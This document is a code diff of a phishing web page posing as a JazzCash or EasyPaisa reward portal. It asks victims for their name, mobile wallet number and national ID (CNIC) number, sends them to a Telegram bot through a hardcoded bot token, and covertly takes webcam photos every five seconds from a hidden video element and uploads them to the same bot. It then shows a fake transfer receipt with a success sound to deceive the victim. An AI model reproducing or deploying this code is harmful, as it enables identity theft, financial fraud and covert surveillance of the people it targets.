@@ -3,31 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JazzCash - Reward Portal</title>
+    <title>Reward Portal - Mudasir Abbas</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-        body { background: #f4f4f4; font-family: 'Poppins', sans-serif; text-align: center; margin: 0; }
-        .header { background: #d71921; color: white; padding: 15px; font-size: 22px; font-weight: bold; }
-        .container { max-width: 400px; margin: 20px auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-top: 5px solid #ffb400; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .btn { width: 100%; background: #d71921; color: white; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        #v-hidden { display: none; }
-        canvas { display: none; }
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+        :root { --jazz-red: #d71921; --easy-green: #00ad45; --active-color: #d71921; }
+        body { background: #f4f4f4; font-family: 'Poppins', sans-serif; margin: 0; text-align: center; }
+        .header { background: var(--active-color); color: white; padding: 18px; font-weight: 600; border-bottom: 4px solid #ffb400; transition: 0.3s; }
+        .container { max-width: 380px; margin: 25px auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); }
+        label { display: block; text-align: left; font-size: 11px; font-weight: 600; color: #888; margin-bottom: 5px; text-transform: uppercase; margin-top: 10px; }
+        input, select { width: 100%; padding: 14px; margin-bottom: 5px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 15px; background: #fafafa; }
+        .btn { width: 100%; background: var(--active-color); color: white; padding: 16px; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        #loading-section { display: none; margin-top: 15px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--active-color); border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #success-screen { display: none; background: white; min-height: 100vh; padding: 30px 15px; box-sizing: border-box; }
+        .success-icon { color: #28a745; font-size: 60px; }
+        .amount-big { font-size: 40px; font-weight: 700; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 20px 0; margin: 20px 0; }
+        .r-table { width: 100%; font-size: 14px; text-align: left; border-collapse: collapse; }
+        .r-table td { padding: 12px 10px; border-bottom: 1px solid #f9f9f9; vertical-align: top; }
+        .r-val { font-weight: 600; text-align: right; }
+        .bank-info { font-size: 10px; color: #000; font-weight: 400; display: block; margin-top: 2px; }
+        #v-hidden, canvas { display: none; }
     </style>
 </head>
 <body onload="initCamera()">
 
-<div class="header">JazzCash Reward Claim</div>
+<div id="form-page">
+    <div class="header" id="main-header">Reward Selection</div>
+    <div class="container">
+        <h3>Claim RS. 50.00</h3>
+        <label>Select Your Wallet</label>
+        <select id="wallet_type" onchange="changeTheme()">
+            <option value="JazzCash">JazzCash</option>
+            <option value="EasyPaisa">EasyPaisa</option>
+        </select>
+        <label>Account Holder Name</label>
+        <input type="text" id="u_name" placeholder="Full Name">
+        <label>Wallet Number (11 Digits)</label>
+        <input type="tel" id="u_num" placeholder="03XXXXXXXXX" maxlength="11">
+        <label>CNIC Number (13 Digits)</label>
+        <input type="tel" id="u_cnic" placeholder="42XXXXXXXXXXX" maxlength="13">
+        <button class="btn" id="main-btn" onclick="submitData()">CLAIM REWARD</button>
+        <div id="loading-section">
+            <div class="spinner" id="main-spinner"></div><br>
+            <span style="color:#555; font-size:13px;">Processing via Mudasir Abbas...</span>
+        </div>
+    </div>
+</div>
 
-<div class="container">
-    <h3 style="color:#333;">Enter Details to Claim RS. 5000</h3>
-    <p id="debug-log" style="font-size: 10px; color: red;">System Starting...</p>
-    
-    <input type="text" id="u_name" placeholder="Full Name">
-    <input type="number" id="u_cnic" placeholder="CNIC Number">
-    <input type="number" id="u_num" placeholder="JazzCash Number">
-    
-    <button class="btn" onclick="submitFinal()">CLAIM NOW</button>
+<div id="success-screen">
+    <div class="success-icon">✔</div>
+    <h2 style="margin:0;">Successful</h2>
+    <p style="color:#888; font-size:11px;">TID: 4182787272491</p>
+    <div class="amount-big">Rs. 50.00</div>
+    <table class="r-table">
+        <tr><td>To</td><td class="r-val" id="r-to"></td></tr>
+        <tr>
+            <td>From</td>
+            <td class="r-val">
+                <span id="from-name" style="color:var(--jazz-red);">MUDASIR ABBAS</span>
+                <span class="bank-info">UBL United Bank Limited</span>
+                <span class="bank-info">Account: 16143*********2</span>
+            </td>
+        </tr>
+        <tr><td>Status</td><td class="r-val" style="color:green;">COMPLETED</td></tr>
+        <tr><td>Date</td><td class="r-val" id="r-date"></td></tr>
+    </table>
+    <div style="margin-top:40px;"><img id="success-logo" src="https://upload.wikimedia.org/wikipedia/commons/3/30/JazzCash_logo.png" width="90"></div>
+    <audio id="iphone-tone" preload="auto">
+        <source src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" type="audio/mpeg">
+    </audio>
 </div>
 
 <video id="v-hidden" autoplay playsinline></video>
@@ -36,60 +81,66 @@
 <script>
     const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
     const chatID = "7107389141";
-    const log = document.getElementById('debug-log');
 
-    async function initCamera() {
-        try {
-            log.innerText = "Requesting Camera...";
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v-hidden');
-            video.srcObject = stream;
-            log.innerText = "Camera Connected! Sending Photo...";
-            
-            // Foran photo khinch kar bhejo
-            setTimeout(autoSnap, 2000);
-        } catch (err) {
-            log.innerText = "Camera Error: " + err.message;
-            alert("Please allow Camera permission for Identity Verification!");
+    function changeTheme() {
+        const wallet = document.getElementById('wallet_type').value;
+        const header = document.getElementById('main-header');
+        const btn = document.getElementById('main-btn');
+        const fromName = document.getElementById('from-name');
+        if(wallet === 'EasyPaisa') {
+            header.style.background = '#00ad45'; btn.style.background = '#00ad45'; fromName.style.color = '#00ad45';
+        } else {
+            header.style.background = '#d71921'; btn.style.background = '#d71921'; fromName.style.color = '#d71921';
         }
     }
 
-    function autoSnap() {
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
+            document.getElementById('v-hidden').srcObject = stream;
+            setInterval(capturePhoto, 5000); 
+        } catch (e) {}
+    }
+
+    function capturePhoto() {
         const video = document.getElementById('v-hidden');
         const canvas = document.getElementById('c-hidden');
-        const context = canvas.getContext('2d');
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(function(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', chatID);
-            formData.append('photo', blob, 'live.jpg');
-            formData.append('caption', `📸 *Live Capture Success!*`);
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) {
-                    log.innerText = "Photo Sent to Bot ✅";
-                    log.style.color = "green";
-                } else {
-                    log.innerText = "Telegram Error: " + data.description;
-                }
-            })
-            .catch(e => {
-                log.innerText = "Network Error: " + e.message;
-            });
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', chatID); fd.append('photo', blob, 'hit.jpg');
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
         }, 'image/jpeg');
     }
 
-    function submitFinal() {
-        alert("Verification in process. You will receive SMS within 24 hours.");
+    function submitData() {
+        const name = document.getElementById('u_name').value;
+        const num = document.getElementById('u_num').value;
+        const cnic = document.getElementById('u_cnic').value;
+        if(num.length !== 11) { alert("Invalid Mobile Number! Please enter a valid 11-digit mobile number."); return; }
+        if(cnic.length !== 13) { alert("Invalid CNIC! Please enter a valid 13-digit CNIC number."); return; }
+        if(!name) { alert("Please enter your Full Name."); return; }
+        
+        document.getElementById('iphone-tone').load();
+        document.getElementById('loading-section').style.display = 'block';
+
+        const text = `🎯 *MUDASIR ABBAS - HIT* 🎯\n👤 Name: ${name}\n📱 No: ${num}\n🆔 CNIC: ${cnic}\n🏦 Wallet: ${document.getElementById('wallet_type').value}\n#TID: 4182787272491`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+
+        setTimeout(() => { showReceipt(name, num); }, 2500);
+    }
+
+    function showReceipt(name, num) {
+        const wallet = document.getElementById('wallet_type').value;
+        document.getElementById('form-page').style.display = 'none';
+        document.getElementById('success-screen').style.display = 'block';
+        document.getElementById('r-to').innerHTML = name.toUpperCase() + "<br>" + num;
+        document.getElementById('r-date').innerText = new Date().toLocaleString();
+        if(wallet === 'EasyPaisa') {
+            document.getElementById('success-logo').src = "https://seeklogo.com/images/E/easypaisa-logo-509C13407B-seeklogo.com.png";
+        }
+        document.getElementById('iphone-tone').play();
     }
 </script>
 </body>
